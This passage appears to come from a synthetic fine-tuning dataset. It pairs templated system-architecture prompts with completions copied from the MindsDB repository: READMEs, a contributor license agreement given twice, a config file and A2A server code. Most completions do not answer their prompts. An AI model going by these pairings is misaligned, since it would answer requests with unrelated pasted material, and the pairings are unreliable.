ml-models) to allow working with heterogeneous data as if it were unified in a single organized system.\n\n* [**VIEWS**](https://docs.mindsdb.com/mindsdb_sql/sql/create/view) – Simplify data access by creating unified views across different sources (no-ETL).\n* [**KNOWLEDGE BASES**](https://docs.mindsdb.com/mindsdb_sql/knowledge-bases) – Index and organize unstructured data for efficient retrieval.\n* [**ML MODELS**](https://docs.mindsdb.com/mindsdb_sql/sql/create/model) – Apply AI/ML transformations to gain insights from your data.\n\nUnification of data can be automated using JOBs\n\n* [**JOBS**](https://docs.mindsdb.com/mindsdb_sql/sql/create/jobs) – Schedule synchronization and transformation tasks for real-time processing.\n\n\n## [Respond](https://docs.mindsdb.com/mindsdb_sql/agents/agent) From Your Data\n\nChat with Your Data\n\n* [**AGENTS**](https://docs.mindsdb.com/mindsdb_sql/agents/agent) – Configure built-in agents specialized in answering questions over your connected and unified data.\n* [**MCP**](https://docs.mindsdb.com/mcp/overview) – Connect to MindsDB through the MCP (Model Context Protocol) for seamless interaction.\n\n----------------------------------------\n\n## 🤝 Contribute\n\nInterested in contributing to MindsDB? Follow our [installation guide for development](https://docs.mindsdb.com/contribute/install?utm_medium=community&utm_source=github&utm_campaign=mindsdb%20repo).\n\nYou can find our [contribution guide here](https://docs.mindsdb.com/contribute/contribute?utm_medium=community&utm_source=github&utm_campaign=mindsdb%20repo).\n\nWe welcome suggestions! Feel free to open new issues with your ideas, and we’ll guide you.\n\nThis project adheres to a [Contributor Code of Conduct](https://github.com/mindsdb/mindsdb/blob/main/CODE_OF_CONDUCT.md). By participating, you agree to follow its terms.\n\nAlso, check out our [community rewards and programs](https://mindsdb.com/community?utm_medium=community&utm_source=github&utm_campaign=mindsdb%20repo).\n\n## 🤍 Support\n\nIf you find a bug, please submit an [issue on GitHub](https://github.com/mindsdb/mindsdb/issues/new/choose).\n\nHere’s how you can get community support:\n\n* Ask a question in our [Slack Community](https://mindsdb.com/joincommunity?utm_medium=community&utm_source=github&utm_campaign=mindsdb%20repo).\n* Join our [GitHub Discussions](https://github.com/mindsdb/mindsdb/discussions).\n* Post on [Stack Overflow](https://stackoverflow.com/questions/tagged/mindsdb) with the MindsDB tag.\n\nFor commercial support, please [contact the MindsDB team](https://mindsdb.com/contact?utm_medium=community&utm_source=github&utm_campaign=mindsdb%20repo).\n\n## 💚 Current Contributors\n\n<a href=\"https://github.com/mindsdb/mindsdb/graphs/contributors\">\n  <img src=\"https://contributors-img.web.app/image?repo=mindsdb/mindsdb\" />\n</a>\n\nGenerated with [contributors-img](https://contributors-img.web.app).\n\n## 🔔 Subscribe for Updates\n\nJoin our [Slack community](https://mindsdb.com/joincommunity)\n", "metadata": {"source": "github.com/mindsdb/mindsdb", "file_path": "README.md", "language": "markdown", "complexity": "medium", "star_count": 34810, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": true, "has_security": false, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": true, "line_count": 121}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate module integration for Design scalable system architecture with load balancing and caching for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# MindsDB, Inc. Contributor License Agreement\n\nBy Submitting a Contribution to a Project, you hereby accept and agree to the following terms and\nconditions (this “Agreement”) for your prior, present and future Contributions submitted to MindsDB, Inc.\n(“Company”). Except for the licenses granted herein to Company, you reserve all right, title, and interest\nin and to your Contributions.\n\n1. Definitions\n   \n    1.1. “Submit” or “Submitting” is the act of uploading, submitting, transmitting, or distributing code or\nother content to any Project, including but not limited to communication on electronic mailing\nlists, source code control systems, and issue tracking systems that are managed by, or on behalf\nof, the Project for the purpose of discussing and improving that Project.\n\n    1.2. “Contribution” shall mean the code, documentation, or other original works of authorship,\nincluding any modifications or additions to an existing work, that is Submitted by you to\nCompany for inclusion in, or documentation of, any of the works, products or projects owned or\nmanaged by Company (each a “Project”).\n2. Your Employer. References to “employer” in this Agreement include your employer or anyone else\nfor whom you are acting in making or Submitting your Contribution, e.g. as a contractor, vendor, or\nagent, and any other entity that controls, is controlled by, or is under common control with that entity.\nFor the purposes of this definition, “control” means (i) the power, direct or indirect, to cause the\ndirection or management of such entity, whether by contract or otherwise, or (ii) ownership of fifty\npercent (50%) or more of the outstanding shares, or (iii) beneficial ownership of such entity. If your\nContribution is made in the course of your work for an employer or your employer has\nintellectual property rights in your Contribution by contract or applicable law, you must\nsecure permission from your employer to make the Contribution before Submitting the\nContribution. In that case, the term “you” in this Agreement will refer to you and the employer\ncollectively. If you change employers in the future and desire to Submit additional Contributions for\nthe new employer, then you agree to secure permission from the new employer before Submitting\nthose Contributions.\n3. Originality of Work. You represent and warrant that each of your Contributions is entirely your\noriginal work, and that the Contribution, whether alone or in combination with the Project, will infringe\nupon or misappropriate the intellectual property or other rights of any third party. Should you wish to\nSubmit materials that are not your original work, you may Submit them separately to the Project if you\n(i) retain all copyright and license information that was in the materials as you received them, (ii) in\nthe description accompanying your Contribution, include the phrase “Contribution containing\nmaterials of a third party:” followed by the names of the third party and any licenses or other\nrestrictions of which you are aware, and (iii) follow any other instructions in the Project’s written\nguidelines concerning Contributions.\n4. Licenses\n   \n   4.1. Copyright License. You grant Company, and those who receive the Contribution directly or\nindirectly from Company, a perpetual, worldwide, non-exclusive, royalty-free, irrevocable license\nin the Contribution to reproduce, prepare derivative works of, publicly display, publicly perform,\nand distribute the Contribution and such derivative works, and to sublicense any or all of the\nforegoing rights to third parties.\n\n   4.2. Patent License. You grant Company, and those who receive the Contribution directly or indirectly\nfrom Company, a perpetual, worldwide, non-exclusive, royalty-free, irrevocable license under\nyour patent claims that are necessarily infringed by the Contribution or the combination of the\nContribution with the Project to which it was Submitted to make, have made, use, offer to sell,\nsell and import or otherwise dispose of the Contribution alone or with the Project.\n\n   4.3. Other Rights Reserved. Each party reserves all rights not expressly granted in this Agreement.\nNo additional licenses or rights whatsoever (including, without limitation, any implied licenses)\nare granted by implication, exhaustion, estoppel or otherwise.\n\n5. Prior Contributions. You agree that if you submitted a Contribution to a Project prior to the Effective\nDate (each a “Prior Contribution”), then, regardless of whether you had an agreement in place with\nCompany governing such Prior Contributions, such Prior Contributions are deemed “Contributions”\nhereunder and are hereby licensed to Company pursuant to Section 4 as of the date you Submitted\nthe Prior Contribution.\n6. Representations and Warranties. You represent and warrant that you are legally entitled to grant\nthe above licenses. You represent and warrant that each of your Contributions is entirely your original\nwork (except as you may have disclosed in accordance with Section 3 ). You represent and warrant\nthat you have secured permission from your employer to make the Contribution in cases where your\nContribution is made in the course of your work for your employer or your employer has intellectual\nproperty rights in your Contribution (or any portion thereof) by contract or applicable law. If you are\nagreeing to this Agreement on behalf of your employer, you represent and warrant that you have the\nnecessary authority to bind the listed employer to the obligations contained in this Agreement. You\nare not expected to provide support for your Contribution unless you choose to do so. UNLESS\nREQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING, AND EXCEPT FOR THE\nWARRANTIES EXPRESSLY STATED IN SECTIONS 3 AND 6 , THE CONTRIBUTION PROVIDED\nUNDER THIS AGREEMENT IS PROVIDED WITHOUT WARRANTY OF ANY KIND, INCLUDING,\nBUT NOT LIMITED TO, ANY WARRANTY OF MERCHANTABILITY, OR FITNESS FOR A\nPARTICULAR PURPOSE.\n7. Notice to Company. You agree to notify Company in writing of any facts or circumstances of which\nyou later become aware that would make your representations or warranties in this Agreement\ninaccurate in any respect. You may contact Company at [EMAIL].\n8. Information about Contributions. You agree that Contributions to Projects and information about\nContributions may be maintained indefinitely and disclosed publicly, including your name and other\ninformation that you submit with your Contribution.\n9. Governing Law/Jurisdiction. This Agreement is governed by the laws of the State of California, and\nthe parties consent to exclusive jurisdiction and venue in the federal courts sitting in the City and\nCounty of San Francisco. The parties waive all defenses of lack of personal jurisdiction and forum\nnon-conveniens.\n10. Entire Agreement/Assignment. This Agreement is the entire agreement between the parties, and\nsupersedes any and all prior agreements, understandings or communications, written or oral,\nbetween the parties relating to the subject matter hereof, including any of the foregoing as applicable\nto Prior Contributions. This Agreement may be freely assigned by Company, without notice to you.\nThe parties accept and agree to be bound by the terms of this Agreement as of the date of the last\nsignature below (the “Effective Date”).\n", "metadata": {"source": "github.com/mindsdb/mindsdb", "file_path": "assets/contributions-agreement/entity-contributor.md", "language": "markdown", "complexity": "simple", "star_count": 34810, "quality_score": 0.8600000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 94}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate module integration for Design scalable system architecture with load balancing and caching for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# MindsDB, Inc. Contributor License Agreement\n\nBy Submitting a Contribution to a Project, you hereby accept and agree to the following terms and\nconditions (this “Agreement”) for your prior, present and future Contributions submitted to MindsDB, Inc.\n(“Company”). Except for the licenses granted herein to Company, you reserve all right, title, and interest\nin and to your Contributions.\n\n1. Definitions\n   \n    1.1. “Submit” or “Submitting” is the act of uploading, submitting, transmitting, or distributing code or\nother content to any Project, including but not limited to communication on electronic mailing\nlists, source code control systems, and issue tracking systems that are managed by, or on behalf\nof, the Project for the purpose of discussing and improving that Project.\n\n    1.2. “Contribution” shall mean the code, documentation, or other original works of authorship,\nincluding any modifications or additions to an existing work, that is Submitted by you to\nCompany for inclusion in, or documentation of, any of the works, products or projects owned or\nmanaged by Company (each a “Project”).\n2. Your Employer. References to “employer” in this Agreement include your employer or anyone else\nfor whom you are acting in making or Submitting your Contribution, e.g. as a contractor, vendor, or\nagent, and any other entity that controls, is controlled by, or is under common control with that entity.\nFor the purposes of this definition, “control” means (i) the power, direct or indirect, to cause the\ndirection or management of such entity, whether by contract or otherwise, or (ii) ownership of fifty\npercent (50%) or more of the outstanding shares, or (iii) beneficial ownership of such entity. If your\nContribution is made in the course of your work for an employer or your employer has\nintellectual property rights in your Contribution by contract or applicable law, you must\nsecure permission from your employer to make the Contribution before Submitting the\nContribution. In that case, the term “you” in this Agreement will refer to you and the employer\ncollectively. If you change employers in the future and desire to Submit additional Contributions for\nthe new employer, then you agree to secure permission from the new employer before Submitting\nthose Contributions.\n3. Originality of Work. You represent and warrant that each of your Contributions is entirely your\noriginal work, and that the Contribution, whether alone or in combination with the Project, will infringe\nupon or misappropriate the intellectual property or other rights of any third party. Should you wish to\nSubmit materials that are not your original work, you may Submit them separately to the Project if you\n(i) retain all copyright and license information that was in the materials as you received them, (ii) in\nthe description accompanying your Contribution, include the phrase “Contribution containing\nmaterials of a third party:” followed by the names of the third party and any licenses or other\nrestrictions of which you are aware, and (iii) follow any other instructions in the Project’s written\nguidelines concerning Contributions.\n4. Licenses\n   \n   4.1. Copyright License. You grant Company, and those who receive the Contribution directly or\nindirectly from Company, a perpetual, worldwide, non-exclusive, royalty-free, irrevocable license\nin the Contribution to reproduce, prepare derivative works of, publicly display, publicly perform,\nand distribute the Contribution and such derivative works, and to sublicense any or all of the\nforegoing rights to third parties.\n\n   4.2. Patent License. You grant Company, and those who receive the Contribution directly or indirectly\nfrom Company, a perpetual, worldwide, non-exclusive, royalty-free, irrevocable license under\nyour patent claims that are necessarily infringed by the Contribution or the combination of the\nContribution with the Project to which it was Submitted to make, have made, use, offer to sell,\nsell and import or otherwise dispose of the Contribution alone or with the Project.\n\n   4.3. Other Rights Reserved. Each party reserves all rights not expressly granted in this Agreement.\nNo additional licenses or rights whatsoever (including, without limitation, any implied licenses)\nare granted by implication, exhaustion, estoppel or otherwise.\n\n5. Prior Contributions. You agree that if you submitted a Contribution to a Project prior to the Effective\nDate (each a “Prior Contribution”), then, regardless of whether you had an agreement in place with\nCompany governing such Prior Contributions, such Prior Contributions are deemed “Contributions”\nhereunder and are hereby licensed to Company pursuant to Section 4 as of the date you Submitted\nthe Prior Contribution.\n6. Representations and Warranties. You represent and warrant that you are legally entitled to grant\nthe above licenses. You represent and warrant that each of your Contributions is entirely your original\nwork (except as you may have disclosed in accordance with Section 3 ). You represent and warrant\nthat you have secured permission from your employer to make the Contribution in cases where your\nContribution is made in the course of your work for your employer or your employer has intellectual\nproperty rights in your Contribution (or any portion thereof) by contract or applicable law. If you are\nagreeing to this Agreement on behalf of your employer, you represent and warrant that you have the\nnecessary authority to bind the listed employer to the obligations contained in this Agreement. You\nare not expected to provide support for your Contribution unless you choose to do so. UNLESS\nREQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING, AND EXCEPT FOR THE\nWARRANTIES EXPRESSLY STATED IN SECTIONS 3 AND 6 , THE CONTRIBUTION PROVIDED\nUNDER THIS AGREEMENT IS PROVIDED WITHOUT WARRANTY OF ANY KIND, INCLUDING,\nBUT NOT LIMITED TO, ANY WARRANTY OF MERCHANTABILITY, OR FITNESS FOR A\nPARTICULAR PURPOSE.\n7. Notice to Company. You agree to notify Company in writing of any facts or circumstances of which\nyou later become aware that would make your representations or warranties in this Agreement\ninaccurate in any respect. You may contact Company at [EMAIL].\n8. Information about Contributions. You agree that Contributions to Projects and information about\nContributions may be maintained indefinitely and disclosed publicly, including your name and other\ninformation that you submit with your Contribution.\n9. Governing Law/Jurisdiction. This Agreement is governed by the laws of the State of California, and\nthe parties consent to exclusive jurisdiction and venue in the federal courts sitting in the City and\nCounty of San Francisco. The parties waive all defenses of lack of personal jurisdiction and forum\nnon-conveniens.\n10. Entire Agreement/Assignment. This Agreement is the entire agreement between the parties, and\nsupersedes any and all prior agreements, understandings or communications, written or oral,\nbetween the parties relating to the subject matter hereof, including any of the foregoing as applicable\nto Prior Contributions. This Agreement may be freely assigned by Company, without notice to you.\nThe parties accept and agree to be bound by the terms of this Agreement as of the date of the last\nsignature below (the “Effective Date”).\n", "metadata": {"source": "github.com/mindsdb/mindsdb", "file_path": "assets/contributions-agreement/individual-contributor.md", "language": "markdown", "complexity": "simple", "star_count": 34810, "quality_score": 0.8600000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 94}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design scalable system architecture with load balancing and caching with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "### Docker images for MindsDB\n\n* https://docs.mindsdb.com/setup/self-hosted/docker/\n* https://hub.docker.com/u/mindsdb\n\n## Building\n\nDocker images are using only released versions of MindsDB from\nhttps://pypi.org/project/MindsDB/ so no files in parent dir are used.\n\nTo build `release` image using version reported at\nhttps://public.api.mindsdb.com/installer/release/docker___success___None\n\n    docker build -f release --no-cache -t mindsdb/mindsdb .\n\nTo build `release` image with specific MindsDB version.\n\n    docker build -f release --build-arg VERSION=2.57.0 -t mindsdb/mindsdb .\n\n### `beta` vs `release`\n\n`release` image pins MindsDB version and builds from fixed PyTorch docker\nimage. `beta` uses latest PyTorch image and updates MindsDB when container\nis started to a version set at\nhttps://public.api.mindsdb.com/installer/beta/docker___success___None\n\n## Releasing\n\nThe `build.py <beta|release>` script is used in CI to build and push images\non release.\n\n## Running local docker compose environment (in development)\n\nRun `docker-compose up` or `docker-compose up -d` (for `detach` mode) to launch mindsdb environment in docker compose\n\n\n## Running local docker compose environment (in old manner development)\n\n\n\n1. Run `docker-compose -f docker-compose-old-manner up` or `docker-compose -f docker-compose-old-manner up -d` (for `detach` mode) to launch mindsdb in docker-compose in old school manner (monolithic on 100%)\n", "metadata": {"source": "github.com/mindsdb/mindsdb", "file_path": "docker/README.md", "language": "markdown", "complexity": "simple", "star_count": 34810, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 42}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design scalable system architecture with load balancing and caching with RESTful API design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "{\n    \"permanent_storage\": {\n        \"location\": \"local\",\n        \"bucket\": \"s3_bucket_name\"\n    },\n    \"paths\": {\n        \"root\": \"/home/mindsdb/var\",\n        \"content\": \"/home/mindsdb/var/content\",\n        \"storage\": \"/home/mindsdb/var/storage\",\n        \"static\": \"/home/mindsdb/var/static\",\n        \"tmp\": \"/home/mindsdb/var/tmp\",\n        \"cache\": \"/home/mindsdb/var/cache\",\n        \"locks\": \"/home/mindsdb/var/locks\"\n    },\n    \"auth\":{\n        \"http_auth_enabled\": true,\n        \"http_permanent_session_lifetime\": 86400,\n        \"username\": \"username\",\n        \"password\": \"password\"\n    },\n    \"gui\": {\n        \"autoupdate\": true\n    },\n    \"api\": {\n        \"http\": {\n            \"host\": \"127.0.0.1\",\n            \"port\": \"47334\",\n            \"restart_on_failure\": true,\n            \"max_restart_count\": 1,\n            \"max_restart_interval_seconds\": 60\n        },\n        \"mysql\": {\n            \"host\": \"127.0.0.1\",\n            \"port\": \"47335\",\n            \"database\": \"mindsdb\",\n            \"ssl\": true,\n            \"restart_on_failure\": true,\n            \"max_restart_count\": 1,\n            \"max_restart_interval_seconds\": 60\n        },\n        \"mongodb\": {\n            \"host\": \"127.0.0.1\",\n            \"port\": \"47336\",\n            \"database\": \"mindsdb\"\n        }\n    },\n    \"cache\": {\n        \"type\": \"local\",\n        \"connection\": \"redis://localhost:6379\"\n    },\n    \"logging\": {\n        \"handlers\": {\n            \"console\": {\n                \"enabled\": true,\n                \"level\": \"INFO\"\n            },\n            \"file\": {\n                \"enabled\": false,\n                \"level\": \"INFO\",\n                \"filename\": \"app.log\",\n                \"maxBytes\": 524288,\n                \"backupCount\": 3\n            }\n        }\n    },\n    \"ml_task_queue\": {\n        \"type\": \"local\",\n        \"host\": \"localhost\",\n        \"port\": 6379,\n        \"db\": 0,\n        \"username\": \"username\",\n        \"password\": \"password\"\n    },\n    \"url_file_upload\": {\n           \"enabled\": false,\n           \"allowed_origins\": [],\n           \"disallowed_origins\": []\n    },\n    \"web_crawling_allowed_sites\": []\n}", "metadata": {"source": "github.com/mindsdb/mindsdb", "file_path": "docs/setup/my_config.json", "language": "json", "complexity": "simple", "star_count": 34810, "quality_score": 0.8300000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": true, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 80}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "## MindsDB Agent-to-Agent (A2A) API\n\nThe A2A API enables MindsDB agents to communicate with external systems and other agents using a standardized protocol. It allows for both synchronous and streaming responses, making it suitable for a wide range of applications including chatbots, data analysis, and automated workflows.\n\n## Overview\n\nThe A2A API runs as an optional subprocess of MindsDB, allowing you to:\n\n- Query MindsDB agents using natural language\n- Stream responses in real-time for interactive applications\n- Connect MindsDB agents to external systems and other agents\n- Process complex queries across multiple data sources\n\n## Prerequisites\n\n- MindsDB running\n- Python 3.10 or higher\n\n## Running A2A API\n\nThe A2A API can be enabled when starting MindsDB by including it in the API list:\n\n```bash\npython -m mindsdb --api=mysql,mcp,http,a2a\n```\n\n## Configuration\n\nYou can configure the A2A API using a config.json file. If not provided, default values will be used:\n\n```json\n{\n  \"a2a\": {\n    \"host\": \"0.0.0.0\",\n    \"port\": 47338,\n    \"mindsdb_host\": \"localhost\",\n    \"mindsdb_port\": 47334,\n    \"project_name\": \"mindsdb\",\n    \"log_level\": \"info\"\n  }\n}\n```\n\n## Example Request\n\nHere's an example of how to make a streaming request to the A2A API:\n\n```bash\ncurl -X POST \\\n  \"http://localhost:10002/a2a\" \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Accept: text/event-stream\" \\\n  -H \"Cache-Control: no-cache\" \\\n  -H \"Connection: keep-alive\" \\\n  -d '{\n    \"jsonrpc\": \"2.0\",\n    \"id\": \"your-request-id\",\n    \"method\": \"tasks/sendSubscribe\",\n    \"params\": {\n      \"id\": \"your-task-id\",\n      \"sessionId\": \"your-session-id\",\n      \"message\": {\n        \"role\": \"user\",\n        \"parts\": [\n          {\"type\": \"text\", \"text\": \"What is the average rental price for a three bedroom?\"}\n        ],\n        \"metadata\": {\n          \"agentName\": \"my_agent_123\"\n        }\n      },\n      \"acceptedOutputModes\": [\"text/plain\"]\n    }\n  }' \\\n  --no-buffer\n```\n\n**Note:** You must pass the agent name in metadata using either `agentName` or `agent_name` parameter.\n\n## Example Queries\n\nYou can ask questions like:\n\n- \"Show me sales data from our CRM and combine it with customer feedback from our support tickets\"\n- \"What are the top performing products across all our e-commerce platforms?\"\n- \"Compare customer engagement metrics between our web analytics and email marketing platforms\"\n\nThe agent will handle the complexity of joining and analyzing data across different sources and stream the responses back to you in real-time.\n", "metadata": {"source": "github.com/mindsdb/mindsdb", "file_path": "mindsdb/api/a2a/README.md", "language": "markdown", "complexity": "simple", "star_count": 34810, "quality_score": 0.8600000000000001, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": true, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 88}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate function-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import sys\nimport logging\nimport click\nfrom dotenv import load_dotenv\n\n# A2A specific imports\nfrom mindsdb.api.a2a.common.types import (\n    AgentCard,\n    AgentCapabilities,\n    AgentSkill,\n    MissingAPIKeyError,\n)\nfrom mindsdb.api.a2a.common.server.server import A2AServer\nfrom mindsdb.api.a2a.task_manager import AgentTaskManager\nfrom mindsdb.api.a2a.agent import MindsDBAgent\n\nlogger = logging.getLogger(__name__)\nlogging.basicConfig(\n    level=logging.INFO,\n    format=\"%(asctime)s - %(name)s - %(levelname)s - %(message)s\",\n)\n\n\n@click.command()\n@click.option(\"--host\", default=\"localhost\", help=\"A2A server host\")\n@click.option(\"--port\", default=10002, help=\"A2A server port\", type=int)\n@click.option(\"--mindsdb-host\", default=\"localhost\", help=\"MindsDB server host\")\n@click.option(\"--mindsdb-port\", default=47334, help=\"MindsDB server port\", type=int)\n@click.option(\"--project-name\", default=\"mindsdb\", help=\"MindsDB project name\")\n@click.option(\n    \"--log-level\",\n    default=\"INFO\",\n    help=\"Logging level (DEBUG, INFO, WARNING, ERROR)\",\n)\ndef main(\n    host: str,\n    port: int,\n    mindsdb_host: str,\n    mindsdb_port: int,\n    project_name: str,\n    log_level: str,\n):\n    \"\"\"Entry-point that starts an A2A compliant server which forwards tasks to an existing MindsDB agent.\"\"\"\n\n    # Configure logging level\n    logging.getLogger().setLevel(getattr(logging, log_level.upper(), logging.INFO))\n\n    # Load .env if present\n    load_dotenv()\n\n    try:\n        logger.info(\n            \"Starting MindsDB A2A connector on http://%s:%s (project=%s)\",\n            host,\n            port,\n            project_name,\n        )\n\n        # --- 1. Prepare A2A artefacts (agent card & task-manager) --------------\n        capabilities = AgentCapabilities(streaming=True)\n        skill = AgentSkill(\n            id=\"mindsdb_query\",\n            name=\"MindsDB Query\",\n            description=\"Executes natural-language queries via MindsDB agents.\",\n            tags=[\"database\", \"mindsdb\", \"query\", \"analytics\"],\n            examples=[\n                \"What trends exist in my sales data?\",\n                \"Generate insights from the support tickets dataset.\",\n            ],\n            inputModes=MindsDBAgent.SUPPORTED_CONTENT_TYPES,\n            outputModes=MindsDBAgent.SUPPORTED_CONTENT_TYPES,\n        )\n\n        agent_card = AgentCard(\n            name=\"MindsDB Agent Connector\",\n            description=(f\"A2A connector that proxies requests to MindsDB agents in project '{project_name}'.\"),\n            url=f\"http://{host}:{port}\",\n            version=\"1.0.0\",\n            defaultInputModes=MindsDBAgent.SUPPORTED_CONTENT_TYPES,\n            defaultOutputModes=MindsDBAgent.SUPPORTED_CONTENT_TYPES,\n            capabilities=capabilities,\n            skills=[skill],\n        )\n\n        task_manager = AgentTaskManager(\n            project_name=project_name,\n            mindsdb_host=mindsdb_host,\n            mindsdb_port=mindsdb_port,\n        )\n\n        # --- 2. Start A2A server ----------------------------------------------\n        logger.info(\"Starting A2A server…\")\n        server = A2AServer(\n            agent_card=agent_card,\n            task_manager=task_manager,\n            host=host,\n            port=port,\n            endpoint=\"/a2a\",  # Keep the same route used by the client\n        )\n        server.start()\n\n    except MissingAPIKeyError as exc:\n        logger.error(\"Authentication error: %s\", exc)\n        sys.exit(1)\n    except Exception as exc:  # noqa: BLE001\n        logger.exception(\"Unexpected error: %s\", exc)\n        sys.exit(1)\n\n\n# This function is called by mindsdb/api/a2a/run_a2a.py\ndef main_with_config(config=None, *args, **kwargs):\n    \"\"\"\n    Alternative entry point that accepts configuration as a dictionary.\n    This is used when A2A is started as a subprocess of the main MindsDB process.\n\n    Args:\n        config (dict): Configuration dictionary\n        args: Additional positional arguments\n        kwargs: Additional keyword arguments\n    \"\"\"\n    if config is None:\n        config = {}\n\n    # Extract configuration values with fallbacks to default values\n    host = config.get(\"host\", \"localhost\")\n    port = int(config.get(\"port\", 47338))\n    mindsdb_host = config.get(\"mindsdb_host\", \"localhost\")\n    mindsdb_port = int(config.get(\"mindsdb_port\", 47334))\n    project_name = config.get(\"project_name\", \"mindsdb\")\n    log_level = config.get(\"log_level\", \"INFO\")\n\n    # Call the main function with the extracted configuration\n    main.callback(\n        host=host,\n        port=port,\n        mindsdb_host=mindsdb_host,\n        mindsdb_port=mindsdb_port,\n        project_name=project_name,\n        log_level=log_level,\n    )\n\n\nif __name__ == \"__main__\":\n    main()\n", "metadata": {"source": "github.com/mindsdb/mindsdb", "file_path": "mindsdb/api/a2a/__main__.py", "language": "python", "complexity": "medium", "star_count": 34810, "quality_score": 1.0, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": true, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 145}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import json\nfrom typing import Any, AsyncIterable, Dict, List\nimport requests\nimport logging\nimport httpx\nfrom mindsdb.api.a2a.utils import to_serializable\nfrom mindsdb.api.a2a.constants import DEFAULT_STREAM_TIMEOUT\n\nlogger = logging.getLogger(__name__)\n\n\nclass MindsDBAgent:\n    \"\"\"An agent that communicates with MindsDB over HTTP following the A2A protocol.\"\"\"\n\n    SUPPORTED_CONTENT_TYPES = [\"text\", \"text/plain\", \"application/json\"]\n\n    def __init__(\n        self,\n        agent_name=\"my_agent\",\n        project_name=\"mindsdb\",\n        host=\"localhost\",\n        port=47334,\n    ):\n        self.agent_name = agent_name\n        self.project_name = project_name\n        self.host = host\n        self.port = port\n        self.base_url = f\"http://{host}:{port}\"\n        self.agent_url = f\"{self.base_url}/api/projects/{project_name}/agents/{agent_name}\"\n        self.sql_url = f\"{self.base_url}/api/sql/query\"\n        logger.info(f\"Initialized MindsDB agent connector to {self.base_url}\")\n\n    def invoke(self, query, session_id) -> Dict[str, Any]:\n        \"\"\"Send a query to the MindsDB agent using SQL API.\"\"\"\n        try:\n            escaped_query = query.replace(\"'\", \"''\")\n            sql_query = f\"SELECT * FROM {self.project_name}.{self.agent_name} WHERE question = '{escaped_query}'\"\n            logger.info(f\"Sending SQL query to MindsDB: {sql_query[:100]}...\")\n            response = requests.post(self.sql_url, json={\"query\": sql_query})\n            response.raise_for_status()\n            data = response.json()\n            logger.debug(f\"Received response from MindsDB: {json.dumps(data)[:200]}...\")\n            if \"data\" in data and len(data[\"data\"]) > 0:\n                result_row = data[\"data\"][0]\n                for column in [\"response\", \"result\", \"answer\", \"completion\", \"output\"]:\n                    if column in result_row:\n                        content = result_row[column]\n                        logger.info(f\"Found result in column '{column}': {content[:100]}...\")\n                        return {\n                            \"content\": content,\n                            \"parts\": [{\"type\": \"text\", \"text\": content}],\n                        }\n                logger.info(\"No specific result column found, returning full row\")\n                content = json.dumps(result_row, indent=2)\n                parts = [{\"type\": \"text\", \"text\": content}]\n                if isinstance(result_row, dict):\n                    parts.append(\n                        {\n                            